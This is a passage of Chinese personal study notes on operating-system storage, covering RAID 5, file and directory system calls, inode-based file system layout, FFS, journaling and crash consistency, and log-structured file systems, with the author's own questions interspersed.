级：旋转奇偶校验为了解决 RAID4 在随机小写入场景中性能糟糕的问题，引入了 RAID 5级，它的思路是不再将奇偶位单独存储在一个磁盘上，而是像普通数据一样，加入轮转的队列；根据顺序，依次存放在不同的磁盘上，例如 P0 在编号磁盘4，P1 在磁盘3，P2 在磁盘2，以此类推； 由于奇偶位引入了轮转存储的机制，因此随机小写入的性能会有所提升，达到约 N * R &#x2F; 4 MB&#x2F;s； 此处有 4 倍的损失原来在于每个小写入，都将导致两次读取 + 两次写入； 总结：不同的 RAID 方案用以实现不同的目标 性能+容量：条带化 RAID0 性能+可靠性：镜像 RAID1 容量+可靠性：RAID5，牺牲一点点随机写入场景下的性能； 30.插叙：文件和目录 问：操作系统应该如何管理文件和存储设备？需要给应用程序提供哪些API？实现环节有哪些注意事项？ 文件和目录文件和目录是操作系统提供给用户关于管理存储数据的一种抽象；文件和目录都有一个自己的编号（inode号），同时还有一个方便用户阅读识别的名称（名称通常可以由用户任意指定，只要不包含一些限制符号）；目录可以用来组织文件的存储结构； 文件在本质上是一个字节的连续数组，每个字节都可以被单独的读取和写入；操作系统实际上只在磁盘上存储或读取该字节数组，它并不关心里面的内容是什么，内容的解析交由应用程序自己来处理； 文件系统接口操作系统提供了一些接口（即系统调用），让应用程序能够进行调用以完成对文件的操作； 创建文件应用程序通过调用 open 接口实现文件的创建，同时传入一些参数，来指定所创建文件的相关要求； 1234int fd = open(&#x27;foo&#x27;, O_CREAT | O_WRONLY | O_TRUNC);// 其中参数 O_CREAT 表示创建新文件，O_WRONLY 表示仅写入，O_TRUNC 表示如果有同名文件，删除其中的内容；// 返回值 fd 是一个文件描述符，它相当于一个指向新创建文件的指针，通过它可以实现后续对文件的写入或读取操作；// fd 是每个进程私有的；不同进程的不同 fd，有可能实际上背后指向的是同一个文件 读写文件：从头开始基本过程： open 某个文件，得到文件描述符； read 该文件描述符，并指定缓冲区大小； write 将缓冲区内容写到目标位置（另一个文件描述符），例如屏幕（标准输出，它的文件描述符一般是 1）； 再次循环 read 和 write，直到文件中没有剩下内容（返回 0）； close 文件； 读写文件：从中间开始lseek 系统调用允许应用程序从文件的中间某个指定位置开始读写操作，并一定非得从头开始； 12345off_t lseek(int fd, off_t off_set, int whence);// off_set 表示偏移量, whence 表示偏移的方式，分别有如下几种情况：// SEEK_SET：从头部开始，偏移 off_set 字节；// SEEK_CUR：当前位置，偏移 off_set 字节；// SEEK_END：从尾部开始，偏移 off_set 字节； 用 fsync() 立即写入正常情况下，当应用程序调用 write 接口将数据写入文件后，操作系统并不是立即去执行这个动作，而是会将待写入数据暂时放在内存缓冲区中，每隔一段固定的时候，再统一向磁盘写一次；这样做的原因是为了提高磁盘的使用性能； 但是有些业务场景需要数据马上写入，例如数据库程序，因此，操作系统有额外提供 fsync() 接口，供应用程序调用； 文件重命名在 Linux 系统下，mv 接口提供了修改文件名的功能，它背后实质上是调用了 rename 接口；rename 接口有一个特性，即它的操作是原子性的，这样做的目的在于避免奇怪的中间状态，导致数据最后丢失，例如重命名的过程当中突然停电了，如果没有原子性，将导致文件即不是原来的名称，也不是新的名称，最后用户找不到了； 获取文件信息除了文件内容外，通常还需要保存一些文件本身的相关信息，即所谓的文件元数据（或者叫头部信息），可以通过 stat 或 fstat 接口来查看；文件系统一般将这些信息存储在一个叫做 inode 的数据结构中，通常包含如下信息： 好奇这里面怎么好像没有文件名称的信息？ 删除文件表面上看，删除文件的接口是 rm，但通过 strace 跟踪可以发现它背后实质上调用的是 unlink； 创建目录创建目录的接口熟悉的老朋友 mkdir；但目录并不能像文件一样被直接写入内容，它的格式在本质上是一堆文件系统元数据，需要使用间接更新的方式（在目录下面创建文件或子目录），来写入一些内容； 这意味着在目录中创建文件或者子目录时，会同时修改目录节点的内容； 目录刚创建的时候，其实含有两个内容条目，一个是引用自身的条目（点目录），一个是引用父级目录的条目（点点目录）； 读取目录读取目录的接口是也一位老朋友：ls；由于目录本身包含的信息很少，只有文件或子目录名称，以及它们的 inode 编号；这意味着当我们使用 -l 选项让 ls 展示更多信息时，它背后实质上是调用了 stat 来获取每个条目的元数据来得到最终结果； 删除目录接口为 rmdir，但是由于这个操作可能涉及将目录中的大量文件删除，是个危险动作；因此一般要求目录为空时，才允许执行（其实这个时候也不完全是空的，里面至少还有点和点点两个条目）； 硬链接link 系统调用可以将一个新文件的名称，链接到某个旧文件名称上；背后的本质其实是让两个文件名称指向同一个 inode 编号；所以文件实质上仍然只有一个，只是名称有了两个； 当我们使用 open 创建一个文件时，操作系统实际上做了两个动作，一个是初始化一个 inode 结构，用来保存文件的元数据；另一个是在目录中增加一个新条目，将某个文件名称，链接到该 inode 结构； 在 inode 结构中有一个引用计数的字段，它用来记录当前有多少个文件名称条目引用到自己，当引用计数为零时，文件系统就会释放存储空间，从而真正的删除文件； 符号链接符号链接也叫软链接，它出现的目的在于解硬链接存在的一些局限性，例如： 不能创建目录的硬链接，因为可能会造成循环引用； inode 编号仅在单个文件系统中是唯一的，在不同的文件系统中则不是；而一个操作系统下通常有多个文件系统（每个文件系统对应一个磁盘分区）； 软链接表面上用起来好像跟硬链接一样，但背后有本质性的不同，它实现上并不是为新文件名增加一个引用条目，而是增加一个文件名的映射，即将新文件名映射到旧文件名；因此软链接的大小取于旧文件名有多长，旧文件名越长，则软链接的大小越大； 软链接相当于给旧的文件名起一个新昵称！ 由于软链接实际上只是文件路径的映射，因此它并不会改变 inode 中的引用计数，这将导致出现悬空引用，即文件可能已经实质上删除了，但软链接仍然存在；这时如果对它进行访问，就会提示失败，找不到文件； 创建并挂载文件系统 问：什么是文件系统？ 答：看上去，文件系统好像是指管理文件的一种方式；文件系统有很多种类型，例如 ext3, ext4, tmpfs, sysfs, NTFS,FAT32, 等；不同类型的文件系统，背后存储和管理数据的方式不同，各有其优缺点；当我们给磁盘进行分区的时候，需要指定使用的格式，其实此时就是在指定文件系统类型；因此一个操作系统中，可能会有多个文件系统类型；但一个磁盘分区只使用一种文件系统类型； 挂载文件系统的接口是 mount，每个文件系统都有自己的根目录，但是通过 mount，可以将各个文件系统统一集成到一个大的目录树项下，而不是多个独立的目录树，这让命名变得统一和方便了起来； 31.文件系统实现CPU 和内存的虚拟化都需要配合硬件才能够实现，但文件和目录的虚拟化（即文件系统）不同，它是一个纯软件，并不需要硬件的配合； 问：如何构建一个文件系统？磁盘上需要存储什么数据结构？它们需要记录什么？它们如何访问？ 实现决策 文件系统采用何种数据结构； 文件如何被访问； 整体组织 先将磁盘按固定大小分成多个块（一般大小为 4KB，块跟扇区有点类似，但一个是在文件系统中虚拟的，一个是在物理磁盘中虚拟的），每个块拥有自己的地址；磁盘变成一个由 n 个块组成的数组；每个块作为最小的存储单位，因此磁盘此时最多可以存储 n 个文件； 由于每个文件都有一个 inode 数据结构用来保存文件的元信息；因此磁盘上还需要划分一个区域用来存储 inode 表；每个 inode 条目此处假设固定分配 256 字节的空间；因此一个 4KB 的块，可以存储 16 个 inode 条目；如果磁盘最多可以存放 n 个文件，意味需要 n &#x2F; 16 个块，用来存放 inode 表； 使用位图来标记其映射的 inode 块或者数据块是否空闲，还是已分配； 使用一个块（称为超级块）来存储关于当前磁盘上的文件系统的一些元信息，例如 inode 块数量、数据块数量、inode 表的起始位置、文件系统类型等； 问：inode 表一开始就已经固定大小了吗？还是随着存储文件的增多，其大小是动态变化的？ 文件组织：inode对于文件系统来说，它是通过 inode 来标识和管理文件的，只要给它一个 inode 索引号，它就可以通过 inode 表找到该 inode 的相关信息，从而知道文件的具体信息； 问：操作系统如何将路径转化成 inode 索引号？ 答：从每级目录的数据块中遍历下一级目录或文件的 inode 编号 只要给定一个 inode 编号，文件系统就可以计算出它在磁盘上的位置（通过起始地址+偏移量计算得到磁盘扇区编号）； 由于磁盘的存储单位是扇区，一般为 512 字节，而此处块的大小为 4KB，二者不同，因此需要做一个换算； inode 对象中包含有关于文件的一些元数据，包括读写权限、用户名、组名、创建&#x2F;修改&#x2F;访问&#x2F;删除时间、硬链接计数、块数量、磁盘指针等信息； 多级索引必须考虑的一个现实问题是文件在磁盘上的存储有可能是不连续的，即存储文件的块，有可能并不全部挨到一起；解决该问题有两种方法： 间接指针：为每个存储块分配一个指针，如果文件很大，意味着指针将很多，inode 肯定是存放不下了，因此一般在 inode 中存放 12 个直接指针（直接指向数据块），加一个间接指针（指向另外一个专门用于存放指针的块，每个块可以放 1024 个指针，即可以指向 1024 个块，每个块 4KB 的存储空间，1024 * 4KB &#x3D; 4MB）；该方案的好处是存储位置非常灵活，没有限制，随便组合都行；缺点是对于特别大的文件，需要花很多块用来存放指针；例如 4GB 的文件意味着需要 1024 * 1024 个块，单这些块就需要占去 1MB 的空间（注意：此处已经引入了双重间接指针，即第一级和第二级指针指向的块，都是存储指针，而不是数据）；对于更大的文件，还可以考虑引入三重甚至四重间接指针； 范围指针：对于连续的块，用一个头部指针 + 一个长度范围来表示；优点：对于大文件，不再需要那么多的块，比较省空间； 目前大多数文件系统都使用了多重间接指针索引的方式来存储文件，并且在 inode 中包含一定数量的直接指针；之所以这么指针，其原因在于大部分的文件都是一些小文件，因此 12 个左右的直接指针一般就够用了，只有少数大文件，才会用到间接指针； 除了间接指针和范围指针外，还有另外一种存储文件的方式是使用链表，将下一个数据块的地址，存放在当前块的末尾；不过这种设计在应对文件内容的随机访问场景时，力有不逮，性能很差，因为需要完全扫描完整个块，才能得到下一个块的地址； 目录组织目录的内容是由元组组成的列表，每个元组中包含关于目录中的文件或子目录的基本信息，如 inode 号、元组的长度、文件名称的长度、文件名称； 当目录中的文件很多时，列表将会很长，因此目录也需要存储在数据块中，并且在 inode 表同样会有一条 inode 记录指向该数据块；因此，目录在本质上其实就是一个特殊类型的文件而已；它的类型信息会标记在 inode 记录中； 由于目录的元组列表在数据块中是连续性存储的，当目录中的某个文件被删除时，其对应的元组将被标记为删除（例如将 inode 号标记为 0）；但是其占用的空间仍然存在，只是该空间现在变成可用的了；如果后续有新的文件写入该目录，就可以利用该空间，重新写一条关于新文件的元组记录； 这么说来，目录中的内容条目并不是按顺序存储的，而是无序的； 由于目录的元组以列表方式存储，这意味着它不能快速定位到某个文件对应的元组记录在第几个，需要从头开始扫描；当目录中的文件少的时候还好，如果文件非常多，则会有一点时间成本； 也有其他一些文件系统如 XFS，不是采用元组列表的形式来存储信息，而是采用 B 树的方式，这使得其扫描速度要快得多； 空闲空间管理管理空闲空间的动作是必须的，因此这样当有新文件需要写入时，才知道将它存放到哪些空闲的数据块上；管理空闲空间的方式有很多种，例如位图、空闲链表（跟内存有点像）、B 树；不同的方式在时间和空间上面各有其优缺点； 为了让数据尽量连续存储，有些文件系统，如 ext2\\ext3，在为新文件寻找空闲数据块时，会尽量一次寻找多个（例如 8 个）的连续空闲块，这样有助于后续提高文件的读定性能； 一个块有 4KB，8 个空闲块有 32 KB，一个扇区有 512B，因此 8 个空闲块约等于 64 个扇区；那么问题来了：磁盘在读取扇区数据时，一次性读入多少个扇区到缓存中？ 访问路径：读取和写入 读取当访问某个路径下的文件时，例如 open(“&#x2F;foo&#x2F;bar”)，实际发生的动作如下： 读取根目录的 inode 内容（在 UNIX 系统中，根目录的 inode 编号固定为 2，因此可以很快根据偏移计算出其磁盘地址）； 从根目录的 inode 对象中，得到其指向的数据块地址；（该数据块保存着根目录下的文件或子目录的元组列表）； 将根目录的数据块内容读取到内存中，遍历它，找到 foo 的 inode 编号，计算出 foo 的 inode 磁盘地址； 从 foo 的 inode 对象中，得到其指向的数据块地址； 将 foo 目录数据块内容读取到内存中，遍历它，找到 bar 的 inode 编号，计算出 bar 的 inode 磁盘地址； 读取 bar 的 inode 对象内容到内容中，检查读写权是否无误； 若无误，返回一个文件描述符，指向该内存地址，完成 open 的调用； 当文件打开后，调用 read() 时，实际发生的动作如下： 从 inode 对象中，获取指向的数据块地址；默认从编号为 0 的数据块开始读取（除非调用过 lseek 更改了偏移量）； 更新 inode 的最后访问时间字段为当前时间； 读取后，更新文件描述符对象中的当前数据块编号，以便下次读取时，可以从上次读取结束后的位置继续； 写入旧文件将数据写入到磁盘还是涉及挺多动作的，除了跟读取一样，将路径先转换成 inode 外，接下来还涉及： 读取数据位图，为新数据分配某个空闲块； 更新数据位图，标记该空闲块的状态为“已占用”； 读取 inode； 添加新的 inode 数据块指针，让其指向刚分配的空闲数据块地址； 将数据写入数据块； 创建新文件以上仅仅是写入数据到一个已存在的文件，如果是创建一个新文件，则涉及的动作还更多一些，包括： 读取 inode 位图，寻找空闲 inode； 将某个空闲 inode 位标记为已使用； 为新文件创建一个 inode 对象，将 inode 对象写入到 inode 表； 读取文件所在目录的 inode，找到其指向的数据块； 向目录的数据块中增加一条记录，映射新建的文件名和它的 inode 编号； 如果目录的数据块已满，则需要分配新的目录数据块，因此还需要读取数据块位图，寻找空闲块，并更新目录的 inode 对象，添加指向新数据块的指针； 缓存和缓冲由于在读写文件时，有很高的磁盘 I&#x2F;O 成本，因此，为了提高性能，引入了缓存机制，即在内存中，划分一片区域作为缓存；在首次读取时，将数据放入到缓存中；由于局部性现象的存在，后续的读取，大概率会命中缓存，而无须发生额外的磁盘 I&#x2F;O； 另外还引入了延迟写入的策略，每隔一段固定的时间，将缓存中的新数据，写入到磁盘上，这种策略有以下几个好处： 如果某个块被多次写入，则最后只发生一次 I&#x2F;O； 如果某个块最后被删除了，则完全没有发生 I&#x2F;O； 待写入的数据暂时放在缓存中，意味着后续对该块的读写，可以直接读取缓存，无须通过 I&#x2F;O 再次访问存储设备； 一般来说，延迟写入的时间间隔为 5-30 秒，但是它有一个缺点，即在写入之前，如果系统崩溃和停机了，待写入的数据将会丢失；有些应用程序对此无法容忍，例如数据库程序，因此它会直接调用 fsync 实现立即写入，避免延迟； 32.局部性和快速文件系统 FFS 早期的 UNIX 系统使用以上结构的文件系统设计，它本质上是将整个磁盘当作一个随机存取的内存来对待（但磁盘跟内存有所不同，内存的随机存取是很快的，但磁盘有寻道成本）；这个设计的好处在于它实现起来非常简单；缺点是随着使用时间的推移，最终将会导致文件的存储变得非常碎片化，从而带来很多的磁盘寻道定位成本（这也是当年为什么会有磁盘碎片整理工具这种东西出现的原因）； 问：如何设计和组织文件系统使用的数据结构，以提高访问性能？以及如何设计分配策略？ FFS：磁盘意识解决办法也很简单，老式 UNIX 文件系统设计的问题在于将整个磁盘当作随机存取的内存使用，因此，有必要反其道而行之；由于暴露给用户的抽象是文件和目录；目录是让用户组织其文件的一种方式；这意味着用户天然会将相同组别的文件放在同一个目录中，而且由于局部性原理，用户在访问下一个文件的时候，跟上一个文件在相同目录的概率比较大； 接下来 FFS 要做两件事情： 将磁盘按柱面分成多个柱面组（很有点类似目录的味道；按柱面的原因在于相同柱面的寻道时间比较短）； 每个柱面组内部像是一个小磁盘，由一个超级块副本+两个位图+数据块组成（跟上章的简单文件系统一模一样）； 将相同目录下的文件，尽量放在同一个组中，避免跨组；（为了让各个目录尽量分散在所有组中，FFS 在放置新目录时，会特意寻找分配数量少的柱面组） 大文件例外分组的另一点核心思想在于让各目录尽量平均分配到不同的组中，避免出现目录的存储出现跨组，不然就失去了局部性所能够带来的好处；但对于特别大的文件来说，它有可能会填满整个组并跨到下一个组，这样就破坏了局部性； 解决这个问题的方法之一是将大文件平均分配到各个组中，而不是在单个组中存储；当然，这样不可避免会带来多次的寻道成本，但这里面会有一个折中，即为了实现预期的传输带宽，应该将单组中的块设置为多大； 目前 FFS 的策略简单而粗暴，它将 inode 的 12 个直接指针指向的数据块和 inode 放在同一组，余下的每一个间接块，跟其指向的数据块，单独放在一个组；不同的间接块，放在不同的组（如果块的大小为 4KB 的话，磁盘地址为 32 位 4 个字节的话，则有 1024 个指针，其指向的数据块的总存储容量为 4MB）； 关于 FFS 的其他几件事子块当块的大小设置为 4KB 时，有利于提高缓存的命中率，从而提高磁盘的读取性能；但是如果磁盘上大量的文件都只有 2KB 的话，将意味着每个 4KB 的块中，都只有一半的空间得到利用，最终结果将导致磁盘的容量利用率只有预期的一半；解决思路是额外引入另外一种小规格的块（称为子块，sub-block），例如大小为 512B 的块，当某个文件少于 2KB 时，文件系统就为其分配子块；如果后续随着时间推移，文件变大了，则继续为其分配更多的子块，直到其大小达到 4KB 后，再为其分配规格为 4KB 的正常块，并将子块的数据复制过去；当然，这种方法带来了复制的成本，不过由于存在延迟写入的机制，这种复制通常只会发生在内存上，而不是在磁盘上； 磁盘缓存当块在磁盘上是按编号顺序连续性存储的时候，将会带来一个问题，即当文件系统发出块 0 的请求后，再次发送块 1 的请求时，磁盘已经放置到块 1 的位置了，而磁盘解析请求本身是需要时间的，因此将错过块 1，需要再完整的放置一周后，才能重新定位到块 1；为了解决这个问题，早期的思路是让块在磁盘上进行跳跃布局，这样可以为解析磁盘请求争取到时间；不过跳跃性布局也会带来一个问题，即最多只能得到磁盘一半的带宽，因为块是间隔存储的；后来现代磁盘引入了磁道缓冲区技术，即在其内部增加了单独的缓存，每次将整个磁道的数据读取到缓存中，这样就不需要担心旋转的问题了； 33.崩溃一致性：FSCK 和日志 问：对于某条数据写入请求，磁盘上数据更新操作是有多个步骤的，而不是原子性的，例如需要分别更新位图、inode 记录、数据块等步骤；当在更新过程中，突然机器出现断电或系统崩溃时，文件系统如何让磁盘上的数据保持一致性的状态，而不是部分写入，部分未写入，导致冲突错误？ 方案一：FSCKFSCK，file system check，文件系统检查；思路很简单，当由于断电或操作系统崩溃等错误发生时，文件系统先啥也不做；然后等再次被操作系统挂载并可用之前，做一次检查，修复之前的错误； FSCK 相当于做了整个磁盘的扫描工作，包括检查超级块、空闲块、inode 状态、inode 链接、重复指针、坏块指针、目录引用等；虽然这种检查方法是有效的，但是性能代价太高昂了，尤其是对于越来越大的磁盘，每次检查将花去几分钟甚至是几小时的时间；实现的目标仅仅某次写入涉及可能存在错误的3个块而已，很不值得； 方案二：日志思路是在将数据写入磁盘之前，将本次要实现的操作，提前单独写在某个指定的地方，形成日志；这样在遇到崩溃的场景时，就可以从日志中提取原来要实现的操作，并检查这些操作是否按预期完成了，如果没有，就重复执行一遍相关的操作，确保它们完成； 数据日志当发生文件的写入时，一般会涉及三个块需要更新，包括 inode、位图、数据块；物理日志的方式，是将这三个块的内容完整的写到日志中，并在其前后各包含一个标识开始 TxB 和结束 TxE 的事务块 TxB：Transaction Begin；TxE：Transaction End； 为了应对在日志写入过程中，出现断电或崩溃的场景，需要将日志的写入分成两部分，先写入头部和三个块，完成后，再写入事务的结束块，并将结束块的大小设置为 512 B，因为这个大小的块，磁盘的写入是原子性的；整个过程的顺序如下： 日志写入：事务头部块和三个块 日志提交：事务的结束块； 加检查点：将三个块写入磁盘； 恢复系统崩溃会在两个时间点下发生： 日志提交前：忽略该段日志，数据丢失； 日志提交后：重放该段日志，按日志对磁盘再做一次操作，数据未丢失； 批处理日志更新写日志的动作其实增加了额外的磁盘 I&#x2F;O，因为除了更新文件和目录的块外，现在又要多一次更新日志块的动作了；为了避免因此带来的性能问题，通常的做法是先将日志数据缓存在内存中，形成一条全局事务，然后每隔一段时间，做一次批处理的更新，而不是每条日志事务单独更新一次磁盘； 如何在批量更新日志时，发生了崩溃，那么日志的内容将会丢失，如果此时有数据正在写入，貌似也会丢失？ 循环日志日志的内容会不断累积，最终超过磁盘容量， 为了避免这个问题，可以通过增加一个日志超级块，加完检查点后，每隔一段时间，将已完成检查点的日志标记为空闲可重用的状态； 元数据日志物理日志存在两个方法的问题： 由于每个数据块需要写入磁盘两次（一次写在日志中，一次写在目标位置中），使得带宽只剩下原来的一半； 日志和目标位于不同的磁道，因为带来了额外的寻道时间成本； 解决办法：不将数据块写日志，只将元数据部分的内容写到日志中；（此种机制下，貌似需要先将数据写入数据块，之后再来写日志） 莫非这就是传说中的逻辑日志？ 棘手的情况：块复用 删除文件和目录时，将带来一场噩梦！想一想，它会发生什么？ 当采用元数据日志的模式时，数据块并没有写入日志，只将元数据写在了日志中；这意味着，与目录有关的更新由于都属于元数据，因此都会写在日志中；当用户在某个目录中添加某个文件时，由于目录的元数据会产生更新，因此，日志中有一条关于该目录更新的日志； 假设之后用户删除了整个目录，并重新创建一个新文件，当采用元数据日志时，日志和该新文件的数据会首先写入磁盘，假设此时写入的位置复用了此前删除的目录的块，然后在日志提交后，系统发生了崩溃；根据原本的协议，系统在恢复后，用户预期应该能够得到崩溃前写入的数据； 但是，此时事情并不能如预期一样发生；因为日志中还有一条关于目录的更新会被重放，而且它发生在创建新文件的日志之前，这意味着在重放时，原本数据块上的新文件数据，将会被覆盖； 有两种办法可以避免该问题： 在某条日志被标记为空闲前（即日志对应的操作已顺利完成，日志块将被复用），避免涉及的块的重用； 日志引入一种新类型的撤销记录，删除目录使用该记录；当重放时，此种类型的记录不重放； 问题1：当删除一个文件时，会发生什么？当在操作过程中发生崩溃后，会发生什么？ 更新文件所在目录的数据块，删除文件的映射记录； 更新 inode 位图和数据块位图，标记为空闲； 以上几个动作需要打包成一个事务，写到日志中，以便确保操作是原子性的，避免文件系统出现不一致； 问题2：当删除一个目录时，会发生什么？当操作过程中发生崩溃后，会发生什么？ 扫描目录中所有映射条目，获取每个条目指向的 inode； 获取每个文件 inode 指向的数据块指针； 将所有文件对应的 inode 位图和数据块位图，标记为空闲； 将目录对应的 inode 位图和数据块位图，标记为空闲； 更新目录所在的父级目录的 inode 属性和元数据块，删除映射； 由于没有 TxE 块的事务是无效的，因此 TxB 块和元数据块写入日志的请求，和数据块的写入请求可以并行发出，重点是 TxE 块的写入请求需要等待前面三个请求完成后才可以发出； 其他方案除了 FSCK 和日志外，其他保持文件系统数据一致性的方案： 强制排序对写入进行强制排序，这样可以避免磁盘出现不一致状态，例如先写数据块，再写 inode； 写时复制copy-on-write；当发生写入时，不覆盖原文件或目录，而是写到空闲块，写完后更新目录结构，让指针指向新的位置；（如果写失败了，数据会丢失，但旧文件仍然保持一致性；貌似更新目录的操作需要是原子性的，避免更新一半的时候失败了）； 反向指针在数据块中添加一个指向 inode 的指针；当发生崩溃时，比对 inode 中的数据块指针，和数据块中的 inode 指针是否匹配（问：如何快速知道哪些写入的指针不匹配？）； 事务校验和不强制事务写入的顺序，而是通过事后计算校验和，来确定是否写入有效，执行成功；（此方法性能不错，但需要磁盘提供新接口； 问：如果在校验之前，系统发生崩溃会怎么样？ 答：写入被当作无效，这样文件系统中不会发生一致性问题，但数据将会丢失好像？ 34.日志结构文件系统 在读了原始论文后，我终于知道它为什么叫日志结构文件系统了，因为传统的文件是将日志做为一种辅助，临时存储目标数据，以便存储过程中发生崩溃时，可以从日志中恢复目标数据；但 LFS 则直接将目标数据存储在日志中，不再单独额外的存储一份目标数据，所以叫日志结构的文件系统，非常形象； 这样做有一个很大的好处是崩溃恢复非常快，无须做全盘检查，只需检查最后更新的那份日志即可；同时目标数据无形中得到了历史快照，可以任意恢复到某个历史版本（如果还没有被覆盖的话）； 寻道成本FFS 快速文件系统在日常场景中的性能并不是特别好，因此每做一次文件更新，需要做很多次磁盘 I&#x2F;O，虽然通过引入缓存，可以缓解这个问题，但这只是将多个 I&#x2F;O 一次性发给磁盘进行顺序优化，实质上仍然不可避免磁盘内部的寻道成本和旋转成本，因为每个磁盘 I&#x2F;O 并不是顺序写入；虽然这些写入由于分组的技术，通常在一个柱面组中，但仍然会带来短寻道和旋转延迟的成本； 考虑内存容量和磁盘传输速度在逐年增加，而寻道和旋转成本却进步缓慢，因此如果能够将文件系统改进为顺序写入，随着时间的推移，将获得越来越大的性能优势； 日志结构文件系统，log-structure file system 名称的由来在于它将整个磁盘当做一个循环日志来对待，就像写日志一样，每次新的写入，都写入到尾部，不覆盖旧数据；等日志写满了后，又重头开始写； 顺序写入解决这个问题的办法有两点： 根据磁盘传输速度，设置足够大的缓存，一次性积累足够多的待写入数据； 将数据发给磁盘做顺序写入，以获得磁盘最大的带宽速度（一般为峰值速度的 90%）； 以上方案的挑战： 顺序写入意味着不现更新和覆盖旧的数据块，而是永远将数据写到新的数据块中；这意味着 inode 的位置将随着每次写入不断的变换位置，需要解决如何定位最新版本的 inode 的问题；（当使用顺序写入的时候，inode 的内容更新同 FFS 并没有什么不同，区别在于将 inode 更新后的内容写入磁盘的时候；LFS 是写入到新的位置，FFS 覆写原来的位置；因此，对于文件原本已有的数据块，仍由 inode 中的原有的指针指向着，没有变化）； 如何定位由于 inode 的位置不断变化，因此需要有一个地方，保存指向最新版本的 inode 地址；LFS 使用 inode map（映射）来解决这个问题，类似于用 inode 编号和 inode 地址组成的键值对；给定一个 inode 号，根据映射将得到它的磁盘地址； 如果将 inode map 映射存储在某个固定的位置，则该位置在文件发生写入时，将不断避免的出现频繁更新，这样会增加寻道成本；因此将 inode map 也作为顺序写入数据的一部分，放置在 inode 右边；注意：imap 中保存着多个文件的映射信息，而不只是一个文件； 另外随着文件的增多，貌似 imap 的体积也会变得越来越大？怎么对应这个问题？另外是否需要标记已经删除的文件，回收 inode 编号？ 虽然 imap 和 inode 一起放置，解决了频繁更新 imap 造成的顺序写入破坏，但是它同样导致 imap 本身也不是不断变化位置的。归根结底，仍然需要有一个持久的数据结构，保存着最新版本的 imap 位置； 检查点区域解决定位 imap 的方案是引入一个检查点区域（CR，Checkpoint Region），它固定在磁盘的头部，其中保存着每个文件的 imap 地址； 由于随着文件写入时，检查点区域同样会出现频繁更新，因此为了避免由于带来的性能问题，它一般设置为每 30 秒更新一次，两次更新期间的数据先保存在内存中；这样就可以将多次 I&#x2F;O 变成一次 I&#x2F;O 了； 问：检查点区域是否存储着多个 imap？还是只有一个？好奇 CR 里面的内容长什么样子 答：CR 里面的内容包括 imap 所有块的地址、段使用表、时间戳、最后一个写入的段的指针； 读取文件当发生文件读取时，文件系统从检查点区域找到 imap 地址，然后根据地址，将整个 imap 加载到内存中；接下来，根据需要读取的文件的 inode 编号，从 imap 数据中查找到该文件的 inode 地址；根据 inode 地址，加载到文件的元数据，并根据其中的数据块地址，读取到文件中的数据； 处理目录当在磁盘上面创建一个文件时，不仅有文件数据需要写入磁盘，同时也需要更新目录数据；因此在顺序写入数据的时候，其实也在顺序写入待更新的目录数据，而由于目录的数据都是元数据，因此每次创建或更新文件，都一直在顺序写入目录中的所有内容（相当于目录的位置一直在发生变动）； 问题来了：根目录如何知道旗下各个子目录所在的映射区的位置？莫非映射区中保存着所有的文件和目录的 inode 映射？如果是这样的话，整个映射区就是一个完整的 inode 表； 如果映射块一直存放在内存中的话，那么读取起来的性能还是很快的； 映射区的设计，很好的规避了递归更新问题；每当创建一个文件时，文件所在的目录的 inode 也需要被更新，此时目录的新 inode 会和文件、新映射一起顺序写入磁盘的新位置；新映射中包含着目录 inode 的新位置，但该目录的 inode 编号并没有变，因此并不需要更新其父目录的 inode ； 从 imap -&gt; inode -&gt; 数据块的查找过程如下： 垃圾收集问题：由于每次更新文件和目录，都是写入新的位置，这不可避免会导致部分旧的数据块失效，变成垃圾块；如果放任不管的话，虽然这些垃圾块并没有指针指向它们，但是它们会在磁盘的空间中形成很多小洞，使用大段连续的空闲空间变得越来越少，从而在未来需要顺序写入的时候，找不到大段的连续空间；同时文件系统也需要额外的机制，来标记这些空闲小洞，负担很大； 解决步骤1：不将磁盘作为一个连续存储空间来处理，而是将其分成很多个段，以段为单位来写入数据；每次需要写入新数据时，即使原来的段没有满，也写到新的段中；这样一来就可以减轻空闲标记的工作（感觉跟内存的分页机制有点像）； LFS 在清理过程中，如果发现段中的部分数据块仍然是有效的，则会将多个段的有效数据合并复制到一个新的段中，然后将多个旧段回收； 突然发现内存有分段分页机制，磁盘也可以有；内存的分段对应不同数据，磁盘的分段对应不同目录均匀分页、相同目录尽量集中的原则； 解决步骤2：LFS 通过在数据块中增加一个头部，来解决空闲块标记的问题；这个头部包含两个信息，该数据块所属文件的 inode 编号，以及其在文件中的数据块索引号；基于这两样信息，文件系统可以到 imap 中找到当前 inode 块地址，并读取 inode 数据，核对相应索引号的数据块地址，看二者是否匹配；如果匹配，表示该块是活的，仍被 inode 指向；如果不匹配，则表示该块已经失效了，不再被 inode 指向，可以清理了； LFS 还偷偷的在数据块头部中写入了文件的版本号信息；当文件发生重大变更时，例如被删除时，LFS 会在文件的 inode 中更新其版本号字段；这样后续在核对是否匹配时，如果版本号不同，则可以直接判断数据块失效，无须再核对数据块地址了，节省了一些时间； 清理策略常见的思路有三种：定期、空闲时、磁盘已满； 崩溃恢复和日志对于 LFS，最重要的一点是保证 CR 检查点区域的更新是原子性的，只要这点保证了，貌似就不会产生一致性的问题；为了实现 CR 更新的原子性，LFS 的做法是建立两个 CR，分别位于磁盘的头部和尾部，交替更新它们，这样某次更新过程中出现崩溃，仍然有一份旧版本的 CR 可以使用； 在更新 CR 的时候，文件系统会先生成一个时间戳，写入 CR 起始位置，再写 CR 主体，最后再写入 CR 尾部；这样如果更新过程中发生了崩溃，文件系统通过比对头尾的时间戳，如果二者不一致，则表示当前的 CR 是无效的； 问：LFS 需要日志吗？如果需要的话，日志保存在哪里？ 答：貌似保存在 CR 中？假设文件系统每 30 秒将数据集中写入磁盘一次，则在写入完成前，如果发生崩溃，如果没有日志，这 30 秒的最新数据将会丢失；如果这个丢失是可以接受的话，则貌似不需要日志也是可以的； 预设前提LFS 的整个设计是建立在磁盘的寻道成本过高的前提下的，这对于磁盘存储设备来说是成立的，但是对于闪存存储类型的设备来说，情况则有所变化，寻道成本开始变得可以忽略不计了；不过 LFS 的设计倒是提供了一个额外的好处，即文件系统意外获得了快照，出现意外情况下非常方便恢复旧版本文件； 35.数据完整性和保护 问题：当数据写入磁盘后，如果确保当数据从磁盘读取出来时，跟之前写入的数据是一样的？ 磁盘故障模式 整个磁盘不工作了，stop and fail； 某个扇区不工作了，latent sector error； 某个块不工作了，block corruption； 整体来说，出现扇区故障和块故障的几率还是不小的： 项目 廉价 昂贵 扇区故障 9.4% 1.4% 块故障 